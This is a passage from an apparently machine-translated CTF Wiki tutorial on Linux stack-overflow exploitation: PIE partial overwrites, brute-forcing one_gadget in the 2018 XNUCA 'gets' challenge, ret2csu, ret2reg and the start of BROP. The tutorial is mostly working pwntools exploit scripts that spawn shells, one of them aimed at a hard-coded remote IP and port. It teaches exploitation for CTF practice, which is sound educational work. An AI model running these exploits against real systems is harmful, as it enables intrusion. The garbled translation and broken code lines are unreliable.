\u2500\u2500\u2500\u2500\u2500\u2500    0x55dc43694a08    call   0x55dc436947e0</p> <p>0x55dc43694a0d    lea    rax, [rbp - 0x30]</p> <p>0x55dc43694a11    mov    edx, 0x60</p> <p>0x55dc43694a16    mov    rsi, rax</p> <p>0x55dc43694a19    mov    edi, 0</p> <p>\u25ba 0x55dc43694a1e    call   0x55dc436947f0</p> <p>0x55dc43694a23    mov    eax, 0</p> <p>0x55dc43694a28 mov rcx, qword ptr [rbp - 8]    0x55dc43694a2c    xor    rcx, qword ptr fs:[0x28]</p> <p>0x55dc43694a35    je     0x55dc43694a3c</p> <p>0x55dc43694a37    call   0x55dc436947c0</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500</p> <p>00:0000\u2502 rax rsi rsp  0x7fff9aa3af20 \u25c2\u2014 0x6161616161616161 ('aaaaaaaa')</p> <p>... \u2193</p> <p>05:0028\u2502              0x7fff9aa3af48 \u25c2\u2014 0xbfe0cfbabccd2861</p> <p>06:0030\u2502 rbp          0x7fff9aa3af50 \u2014\u25b8 0x7fff9aa3af70 \u2014\u25b8 0x55dc43694a80 \u25c2\u2014 push   r15</p> <p>07:0038\u2502              0x7fff9aa3af58 \u2014\u25b8 0x55dc43694a6a \u25c2\u2014 mov    eax, 0</p> <p>pwndbg&gt; x/10i (0x0A3E+0x55dc43694000) </p> <p>0x55dc43694a3e:  push   rbp</p> <p>0x55dc43694a3f:  mov    rbp,rsp</p> <p>0x55dc43694a42:  lea    rdi,[rip+0xd7]        # 0x55dc43694b20</p> <p>0x55dc43694a49:  call   0x55dc436947d0</p> <p>0x55dc43694a4e:  nop</p> <p>0x55dc43694a4f:  pop    rbp</p> <p>0x55dc43694a50: right    0x55dc43694a51:  push   rbp</p> <p>0x55dc43694a52:  mov    rbp,rsp</p> <p>0x55dc43694a55:  sub    rsp,0x10</p> <pre><code>It can be found that the return address at this time is different from the 16 bits of the address of the get shell function. If the lower 16 bits are set to `0x?A3E`, there is a certain probability of getting shell.\n\n\nThe final script is as follows:\n```python\n\n#!/usr/bin/env python\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom pwn import *\n\n#  context.log_level = \"debug\"\n\ncontext.terminal = [\"deepin-terminal\", \"-x\", \"sh\", \"-c\"]\n\n\n\nwhile True:\n\n    try:\n\n        io = process(\"./babypie\", timeout = 1)\n\n\n\n# gdb.attach (I)\n        io.sendafter(\":\\n\", 'a' * (0x30 - 0x8 + 1))\n\nio.recvuntil (&amp;#39;a&amp;#39; * (0x30 - 0x8 + 1))\ncanary = &amp;#39;0&amp;#39; + io.recvn (7)\n        success(canary.encode('hex'))\n\n\n\n# gdb.attach (I)\n        io.sendafter(\":\\n\", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\\x3E\\x0A')\n\n\n\nio.interactive ()\n    except Exception as e:\n\nio.close ()\nprint e\n</code></pre> <p>It should be noted that this technique is not only effective on the stack, but also an effective means of bypassing address randomization on the heap.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#2018-xnuca-gets","title":"2018-XNUCA-gets","text":"<p>This topic is also very interesting, as follows</p> <pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n\n{\n\nchar * v4; // [rsp + 0h] [rbp-18h]\n\n\ngets ((char *) &amp;amp; v4);\n  return 0LL;\n\n}\n</code></pre> <p>The program is so small that there is obviously a stack overflow vulnerability, but there is no leak. .</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#determining-protection_2","title":"Determining protection","text":"<p>First take a look at the protection of the program</p> <pre><code>[*] '/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'\n\n    Arch:     amd64-64-little\n\n    RELRO:    Full RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre> <p>It is better that the program does not have a canary. Naturally, we can easily control the EIP of the program, but it is a problem to control where.</p>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#analysis","title":"Analysis","text":"<p>We know the basic execution flow of the program through the basic execution flow (executable part) of ELF. At the same time, we find that there are two function return addresses on the stack.</p> <p><code>`</code>asm pwndbg&gt; stack 25</p> <p>00:0000\u2502 rsp  0x7fffffffe398 \u2014\u25b8 0x7ffff7a2d830 (__libc_start_main+240) \u25c2\u2014 mov    edi, eax</p> <p>01:0008\u2502      0x7fffffffe3a0 \u25c2\u2014 0x1</p> <p>02:0010\u2502      0x7fffffffe3a8 \u2014\u25b8 0x7fffffffe478 \u2014\u25b8 0x7fffffffe6d9 \u25c2\u2014 0x6667682f746e6d2f ('/mnt/hgf')</p> <p>03:0018\u2502      0x7fffffffe3b0 \u25c2\u2014 0x1f7ffcca0</p> <p>04:0020\u2502      0x7fffffffe3b8 \u2014\u25b8 0x400420 \u25c2\u2014 sub    rsp, 0x18</p> <p>05:0028\u2502      0x7fffffffe3c0 \u25c2\u2014 0x0</p> <p>06:0030\u2502      0x7fffffffe3c8 \u25c2\u2014 0xf086047f3fb49558</p> <p>07:0038\u2502      0x7fffffffe3d0 \u2014\u25b8 0x400440 \u25c2\u2014 xor    ebp, ebp</p> <p>08:0040\u2502      0x7fffffffe3d8 \u2014\u25b8 0x7fffffffe470 \u25c2\u2014 0x1</p> <p>09:0048\u2502      0x7fffffffe3e0 \u25c2\u2014 0x0</p> <p>... \u2193</p> <p>0b:0058\u2502      0x7fffffffe3f0 \u25c2\u2014 0xf79fb00f2749558</p> <p>0c:0060\u2502      0x7fffffffe3f8 \u25c2\u2014 0xf79ebba9ae49558</p> <p>0d:0068\u2502      0x7fffffffe400 \u25c2\u2014 0x0</p> <p>... \u2193</p> <p>10: 0080\u2502 0x7fffffffe418 \u2014\u25b8 0x7fffffffe488 \u2014\u25b8 0x7fffffffe704 \u25c2\u2014 0x504d554a4f545541 ('AUTOMOTIVE') 11:0088\u2502      0x7fffffffe420 \u2014\u25b8 0x7ffff7ffe168 \u25c2\u2014 0x0</p> <p>12:0090\u2502      0x7fffffffe428 \u2014\u25b8 0x7ffff7de77cb (_dl_init+139) \u25c2\u2014 jmp    0x7ffff7de77a0</p> <pre><code>Where `__libc_start_main+240` is in libc and `_dl_init+139` is in ld\n</code></pre> <p>0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</p> <p>0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</p> <p>0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</p> <p>0x7ffff7dd1000 0x7ffff7dd3000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd3000 0x7ffff7dd7000 rw-p 4000 0 0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</p> <pre><code>A more natural idea is that we use partial overwrite to modify these two addresses to a location that gets the shell, which is naturally a Onegadget. So which one do we cover? ?\n\n\nLet&amp;#39;s first analyze the base address `0x7ffff7a0d000` of `libc`. We generally want to cover the bytes, at least 1 nibble to be able to get jumped to onegadget. However, when the program reads it, it is read by `gets`, which means that `\\x00` will definitely exist at the end of the string.\n\n\nWhen we cover the bytes, we must cover the integer multiples, that is, we will cover at least 3 bytes, and let&amp;#39;s take a look at the address `0x7ffff7a2d830` of `__libc_start_main+240`. If it covers 3 bytes, it is `0x7ffff700xxxx `, has been less than the base address of libc, there is no code position deliberately executed before.\n\n\nIn general, the offset of libc_start_main in libc is not too bad, so obviously if we overwrite `__libc_start_main+240`, it is obviously impossible.\n\n\nAnd the base address of ld? If we overwrite `_dl_init+139` on the stack, it is `0x7ffff700xxxx`. Looking at the above memory layout, we can find that `libc` is in the low address direction of `ld`, so when randomizing, it is very likely that the third byte of libc is `\\x00`.\n\n\nFor example, the current offset between the two is\n</code></pre> <p>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000</p> <pre><code>Then if ld is loaded to `0x7ffff73ca000`, then the starting address of `libc` is obviously `0x7ffff7000000`.\n\n\nTherefore, we have a good reason to choose to overwrite the `_dl_init+139` stored on the stack. So what is it covered? Still don&amp;#39;t know. Because we don&amp;#39;t know what the library version of libc is,\n\n\nWe can cover the coverage first and see if the program will crash. After all, it is very likely that the code in the libc library will be executed.\n\n\n```python\n\nfrom pwn import *\n\ncontext.terminal = ['tmux', 'split', '-h']\n\n#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']\n\nif args['DEBUG']:\n\n    context.log_level = 'debug'\n\nelfpath = './gets'\n\ncontext.binary = elfpath\n\n\n\nelf = ELF (elf path)\nbits = elf.bits\n\n\n\n\n\ndef exp(ip, port):\n\n    for i in range(0x1000):\n\n        if args['REMOTE']:\n\n            p = remote(ip, port)\n\n        else:\n\n            p = process(elfpath, timeout=2)\n\n        # gdb.attach(p)\n\n        try:\n\n            payload = 0x18 * 'a' + p64(0x40059B)\n\n            for _ in range(2):\n\n                payload += 'a' * 8 * 5 + p64(0x40059B)\n\n            payload += 'a' * 8 * 5 + p16(i)\n\n            p.sendline(payload)\n\n            data = p.recv()\n\n            print data\n\n            p.interactive()\n\n            p.close()\n\n        except Exception:\n\n            p.close()\n\n            continue\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    exp('106.75.4.189', 35273)\n</code></pre> <p>Finally, we found the following error. On the one hand, we can judge that this is definitely the 2.23 version of libc; on the other hand, we can finally locate the version of libc by <code>(cfree+0x4c)[0x7f57b6f9253c]</code>.</p> <pre><code>======= Backtrace: =========\n\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]\n\n/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]\n\n/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]\n\n/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]\n\n[0x7ffdec480f20]\n\n======= Memory map: ========\n\n00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets\n\n00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets\n00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets\n\n00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]\n\n7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0\n\n7f57b0021000-7f57b4000000 ---p 00000000 00:00 0\n\n7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n\n7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n\n7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so\n\n7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so\n\n7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so\n\n7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so\n7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0\n7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so\n\n7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0\n7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0\n7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so\n\n7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so\n\n7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0\n\n7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]\n\n7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]\n\n7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]\n\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n</code></pre> <p>After determining the version of libc, we can choose one_gadget, here I choose the first one, the lower address.</p> <pre><code>\u279c  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6\n\n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\n\nconstraints:\n\n  rax == NULL\n\n\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\n\nconstraints:\n\n  [rsp+0x30] == NULL\n\n\n\n0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ)\n\nconstraints:\n\n  [rsp+0x50] == NULL\n\n\n\n0xf1147 execve(\"/bin/sh\", rsp+0x70, environ)\n\nconstraints:\n\n  [rsp+0x70] == NULL\n</code></pre> <p>Continue to blast with the following exp,</p> <pre><code>from pwn import *\n\ncontext.terminal = ['tmux', 'split', '-h']\n\n#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']\n\nif args['DEBUG']:\n\n    context.log_level = 'debug'\n\nelfpath = './gets'\n\ncontext.binary = elfpath\n\n\n\nelf = ELF (elf path)\nbits = elf.bits\n\n\n\n\n\ndef exp(ip, port):\n\n    for i in range(0x1000):\n\n        if args['REMOTE']:\n\n            p = remote(ip, port)\n\n        else:\n\n            p = process(elfpath, timeout=2)\n\n        # gdb.attach(p)\n\n        try:\n\n            payload = 0x18 * 'a' + p64(0x40059B)\n\n            for _ in range(2):\n\n                payload += 'a' * 8 * 5 + p64(0x40059B)\n\n            payload += 'a' * 8 * 5 + '\\x16\\02'\n\n            p.sendline(payload)\n\n\n\np.sendline (&amp;#39;ls&amp;#39;)\n            data = p.recv()\n\n            print data\n\n            p.interactive()\n\n            p.close()\n\n        except Exception:\n\n            p.close()\n\n            continue\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    exp('106.75.4.189', 35273)\n</code></pre> <p>Finally get the shell.</p> <pre><code>$ ls\nexp.py  gets\n</code></pre>"},{"location":"pwn/linux/stackoverflow/fancy-rop/#title_2","title":"Title","text":""},{"location":"pwn/linux/stackoverflow/medium-rop/","title":"\u4e2d\u7ea7ROP","text":"<p>The intermediate ROP mainly uses some clever Gadgets.</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#ret2csu","title":"ret2csu","text":""},{"location":"pwn/linux/stackoverflow/medium-rop/#principle","title":"Principle","text":"<p>In 64-bit programs, the first six arguments to a function are passed through registers, but most of the time, it's hard to find the gadgets for each register. At this time, we can take advantage of the gadgets in __libc_csu_init under x64. This function is used to initialize libc, and the general program will call the libc function, so this function will exist. Let's take a look at this function first (of course, there are some differences between different versions of this function)</p> <p><code>`</code>asm .text:00000000004005C0 ; void _libc_csu_init(void)</p> <p>.text:00000000004005C0                 public __libc_csu_init</p> <p>.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o</p> <p>.text:00000000004005C0                 push    r15</p> <p>.text:00000000004005C2                 push    r14</p> <p>.text: 00000000004005C4 mov r15d, edi .text:00000000004005C7                 push    r13</p> <p>.text:00000000004005C9                 push    r12</p> <p>.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</p> <p>.text:00000000004005D2                 push    rbp</p> <p>.text: 00000000004005D3 lea rbp, __do_global_dtors_to_final_array_entry .text:00000000004005DA                 push    rbx</p> <p>.text:00000000004005DB                 mov     r14, rsi</p> <p>.text:00000000004005DE                 mov     r13, rdx</p> <p>.text:00000000004005E1                 sub     rbp, r12</p> <p>.text:00000000004005E4                 sub     rsp, 8</p> <p>.text: 00000000004005E8 sar rbp, 3 .text:00000000004005EC                 call    _init_proc</p> <p>.text:00000000004005F1                 test    rbp, rbp</p> <p>.text:00000000004005F4                 jz      short loc_400616</p> <p>.text:00000000004005F6                 xor     ebx, ebx</p> <p>.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</p> <p>.text:0000000000400600</p> <p>.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j</p> <p>.text:0000000000400600                 mov     rdx, r13</p> <p>.text:0000000000400603                 mov     rsi, r14</p> <p>.text: 0000000000400606 mov, r15d .text:0000000000400609                 call    qword ptr [r12+rbx*8]</p> <p>.text:000000000040060D                 add     rbx, 1</p> <p>.text:0000000000400611                 cmp     rbx, rbp</p> <p>.text:0000000000400614                 jnz     short loc_400600</p> <p>.text:0000000000400616</p> <p>.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j</p> <p>.text:0000000000400616                 add     rsp, 8</p> <p>.text:000000000040061A                 pop     rbx</p> <p>.text:000000000040061B                 pop     rbp</p> <p>.text:000000000040061C                 pop     r12</p> <p>.text:000000000040061E                 pop     r13</p> <p>.text:0000000000400620                 pop     r14</p> <p>.text:0000000000400622                 pop     r15</p> <p>.text: 0000000000400624 retn .text:0000000000400624 __libc_csu_init endp</p> <pre><code>Here we can use the following points\n\n\n- From 0x000000000040061A to the end, we can use the stack overflow to construct data on the stack to control the data in the rbx, rbp, r12, r13, r14, r15 registers.\n- From 0x0000000000400600 to 0x0000000000400609, we can assign r13 to rdx, r14 to rsi, and r15d to edi (note that although this is assigned edi, ** but the high 32 bits of rdi at this time The register value is 0 (self-tuning)**, so we can control the value of the rdi register, but only the lower 32 bits, and these three registers are the first three registers passed in the x64 function call. Also, if we can reasonably control r12 and rbx, then we can call the function we want to call. For example, we can control rbx to be 0, and r12 is the address of the function we want to call.\n- From 0x000000000040060D to 0x0000000000400614, we can control the relationship between rbx and rbp as rbx+1 = rbp, so we will not execute loc_400600, and we can continue to execute the following assembler. Here we can simply set rbx=0, rbp=1.\n\n\n###example\n\n\nHere we take the steamed rice step by step to learn the level5 of the linux linux_x64 article as an example. First check the security of the program\n\n\n```shell\n\n\u279c  ret2__libc_csu_init git:(iromise) \u2717 checksec level5\n\n    Arch:     amd64-64-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre> <p>The program is 64-bit and the stack unenforceable protection is turned on.</p> <p>Second, looking for bugs in the program, you can see that there is a simple stack overflow in the program.</p> <pre><code>ssize_t vulnerable_function()\n\n{\n\n  char buf; // [sp+0h] [bp-80h]@1\n\n\n\n  return read(0, &amp;buf, 0x200uLL);\n\n}\n</code></pre> <p>A simple browsing of the program, found that the program has neither the system function address nor the /bin/sh string, so both of us need to construct ourselves.</p> <p>**Note: Here I tried to use the system function to get the shell failed. It should be a problem with environment variables, so here is the execve to get the shell. **</p> <p>Basic use ideas are as follows</p> <ul> <li>Execute libc_csu_gadgets with stack overflow to get the address of the write function and cause the program to re-execute the main function</li> <li>Get the corresponding libc version and execve function address according to libcsearcher</li> <li>Re-execute libc_csu_gadgets with stack overflow to write the execve address and the '/bin/sh' address to the bss section and cause the program to re-execute the main function.</li> <li>Execute libc_csu_gadgets again with stack overflow to execute execve('/bin/sh') to get the shell.</li> </ul> <p>Exp is as follows</p> <pre><code>from pwn import *\n\nfrom LibcSearcher import LibcSearcher\n\n\n\n#context.log_level = 'debug'\n\n\n\nlevel5 = ELF (&amp;#39;./ level5&amp;#39;)\nsh = process('./level5')\n\n\n\nwrite_got = level5.got['write']\n\nread_got = level5.got['read']\n\nmain_addr = level5.symbols['main']\n\nbss_base = level5.bss()\n\ncsu_front_addr = 0x0000000000400600\n\ncsu_end_addr = 0x000000000040061A\n\nfakeebp = 'b' * 8\n\n\n\n\n\ndef csu(rbx, rbp, r12, r13, r14, r15, last):\n\n    # pop rbx,rbp,r12,r13,r14,r15\n\n    # rbx should be 0,\n\n    # rbp should be 1,enable not to jump\n\n    # r12 should be the function we want to call\n\n# rdi = ID = r15d\n# rsi = r14\n    # rdx=r13\n\n    payload = 'a' * 0x80 + fakeebp\n    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(\n\n        r13) + p64(r14) + p64(r15)\n\n    payload += p64(csu_front_addr)\n\n    payload += 'a' * 0x38\n\n    payload += p64(last)\n\n    sh.send(payload)\n\n    sleep(1)\n\n\n\n\n\nsh.recvuntil('Hello, World\\n')\n\n## RDI, RSI, RDX, RCX, R8, R9, more on the stack\n\n## write(1,write_got,8)\n\ncsu(0, 1, write_got, 8, write_got, 1, main_addr)\n\n\n\nwrite_addr = u64(sh.recv(8))\n\nlibc = LibcSearcher('write', write_addr)\n\nlibc_base = write_addr - libc.dump('write')\n\nexecve_addr = libc_base + libc.dump('execve')\n\nlog.success('execve_addr ' + hex(execve_addr))\n\n##gdb.attach(sh)\n\n\n\n## read(0,bss_base,16)\n\n## read execve_addr and /bin/sh\\x00\n\nsh.recvuntil('Hello, World\\n')\n\ncsu(0, 1, read_got, 16, bss_base, 0, main_addr)\n\nsh.send(p64(execve_addr) + '/bin/sh\\x00')\n\n\n\nsh.recvuntil('Hello, World\\n')\n\n## execve(bss_base+8)\n\ncsu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/stackoverflow/medium-rop/#thinking","title":"Thinking","text":""},{"location":"pwn/linux/stackoverflow/medium-rop/#improve","title":"Improve","text":"<p>In the above, we directly used this generic gadgets with a byte length of 128. However, not all bugs allow us to enter such long bytes. So what do we do when we allow a small number of bytes to enter? Here are a few methods</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#improve-1-control-rbx-and-rbp-in-advance","title":"Improve 1 - Control rbx and rbp in advance","text":"<p>It can be seen that in our previous utilization, we used the values of these two registers mainly to satisfy the condition of cmp and jump. If we can control these two values in advance, then we can reduce 16 bytes, that is, we need only 112 for the number of bytes we need.</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#improvement-2-multiple-use","title":"Improvement 2-Multiple use","text":"<p>In fact, improvement 1 is also a multi-use. We can see that our gadgets are divided into two parts, so we can actually make two calls to achieve the purpose, in order to reduce the number of bytes required for a gadget. But the multiple uses here require more stringent conditions.</p> <ul> <li>Vulnerabilities can be triggered multiple times</li> <li>The program has not modified the r12-r15 register between triggers because it is called twice.</li> </ul> <p>** Of course, sometimes we will encounter a large number of bytes that can be read in one time, but the vulnerability is not allowed to be reused. At this time, we need to arrange all the bytes at once and then use it slowly. **</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#gadget","title":"gadget","text":"<p>In fact, in addition to the above gadgets, gcc will compile some other functions by default.</p> <pre><code>_init\n\n_start\n\ncall_gmon_start\n\nderegister_tm_clones\n\nregister_tm_clones\n\n__do_global_dtors_aux\nframe_dummy\n\n__libc_csu_init\n\n__libc_csu_fini\n_fini\n</code></pre> <p>We can also try to use some of the code to perform. In addition, since the PC itself simply passes the data at the execution address of the program to the CPU, the CPU simply decodes the transferred data, and as long as the decoding is successful, it is executed. So we can offset some of the addresses in the source program to get the instructions we want, as long as we can ensure that the program does not crash.</p> <p>Need to say that in the above libc_csu_init we mainly use the following registers</p> <ul> <li>Control rbx, rbp, r12, r13, r14, r15 with the tail code.</li> <li>Control rdx, rsi, edi with the code in the middle section.</li> </ul> <p>In fact, the tail of libc_csu_init can control other registers by offset. Among them, 0x000000000040061A is the normal starting address, ** can see that we can control the rbp register at 0x000000000040061f, and can control the rsi register at 0x0000000000400621. ** And if you want to understand this part in depth, you need to have a more thorough understanding of each field in the assembly instructions. as follows.</p> <p><code>`</code>asm gef\u27a4  x/5i 0x000000000040061A</p> <p>0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx</p> <p>0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</p> <p>0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</p> <p>0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</p> <p>0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</p> <p>gef\u27a4  x/5i 0x000000000040061b</p> <p>0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp</p> <p>0x40061c &lt;__libc_csu_init+92&gt;:   pop    r12</p> <p>0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</p> <p>0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</p> <p>0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</p> <p>gef\u27a4  x/5i 0x000000000040061A+3</p> <p>0x40061d &lt;__libc_csu_init+93&gt;:   pop    rsp</p> <p>0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</p> <p>0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</p> <p>0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</p> <p>0x400624 &lt;__ libc_csu_init + 100&gt;: right gef\u27a4  x/5i 0x000000000040061e</p> <p>0x40061e &lt;__libc_csu_init+94&gt;:   pop    r13</p> <p>0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</p> <p>0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</p> <p>0x400624 &lt;__ libc_csu_init + 100&gt;: right    0x400625:    nop</p> <p>gef\u27a4  x/5i 0x000000000040061f</p> <p>0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</p> <p>0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</p> <p>0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</p> <p>0x400624 &lt;__ libc_csu_init + 100&gt;: right    0x400625:    nop</p> <p>gef\u27a4  x/5i 0x0000000000400620</p> <p>0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</p> <p>0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</p> <p>0x400624 &lt;__ libc_csu_init + 100&gt;: right    0x400625:    nop</p> <p>0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</p> <p>gef\u27a4  x/5i 0x0000000000400621</p> <p>0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</p> <p>0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</p> <p>0x400624 &lt;__ libc_csu_init + 100&gt;: right    0x400625:    nop</p> <p>gef\u27a4  x/5i 0x000000000040061A+9</p> <p>0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</p> <p>0x400624 &lt;__ libc_csu_init + 100&gt;: right    0x400625:    nop</p> <p>0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</p> <p>0x400630 &lt;__libc_csu_fini&gt;: repz ret <pre><code>### Title\n\n\n- 2016 XDCTF pwn100\n\n- 2016 Huashan Cup SU_PWN\n\n\n### Reference reading\n\n\n- http://wooyun.jozxing.cc/static/drops/papers-7551.html\n\n- http://wooyun.jozxing.cc/static/drops/binary-10638.html\n\n\n\n## ret2reg\n\n\n### Principle\n\n\n1. Check which register value points to the overflow buffer space when the overflow function returns.\n2. Then decompile the binary, look for the call reg or jmp reg command, and set the EIP to the instruction address.\n3. Inject the shellcode into the space pointed to by reg (you need to make sure that the space is executable, but it is usually on the stack)\n\n\n## BROP\n\n\n### basic introduction\n\n\nBROP (Blind ROP) was presented by Andrea Bittau of Standford in 2014. The relevant research results were published in Oakland 2014. The title of the paper is **Hacking Blind**. The following is the author&amp;#39;s corresponding paper and slides, and the author&amp;#39;s corresponding introduction.\n\n\n- [paper] (http://www.scs.stanford.edu/brop/bittau-brop.pdf)\n- [slide] (http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)\n\n\nBROP is an execution flow that hijacks a program without attacking the program under the source code or binary file of the corresponding application.\n\n\n### Attack conditions\n\n\n1. The source program must have a stack overflow vulnerability so that an attacker can control the program flow.\n2. The server-side process restarts after a crash, and the restarted process has the same address as the previous address (that is, even if the program has ASLR protection, it only works when the program is initially started). Currently, server applications such as nginx, MySQL, Apache, and OpenSSH are compatible with this feature.\n\n\n### Attack principle\n\n\nCurrently, most applications will open ASLR, NX, Canary protection. Here we explain how to bypass these protections in BROP and how to attack them.\n\n\n#### The basic idea\n\n\nIn BROP, the basic following ideas are as follows\n\n\n- Determine the stack overflow length\n- Violent enumeration\n-   Stack Reading\n\n- Get data on the stack to leak canaries, as well as ebp and return address.\n- Blind ROP\n- Find enough gadgets to control the parameters of the output function and call them, such as the common write function and the puts function.\n-   Build the exploit\n\n- Use the output function to dump the program so that you can find more gadgets so you can write the final exploit.\n\n\n#### Stack overflow length\n\n\nYou can enumerate directly from 1 violence until you find the program crashes.\n\n\n#### Stack Reading\n\n\n\nAs shown below, this is the current classic stack layout\n</code></pre></p> <p>buffer|canary|saved fame pointer|saved returned address</p> <pre><code>To get the canary and the variables that follow, we need to solve the first problem, how to get the length of the overflow, which can be obtained by continuous trial.\n\n\nSecondly, regarding the canary and the following variables, the method used is the same. Here we take canary as an example.\n\n\nCanary itself can be obtained by blasting, but it is obviously inefficient if you just enumerate all the values stupidly.\n\n\nIt should be 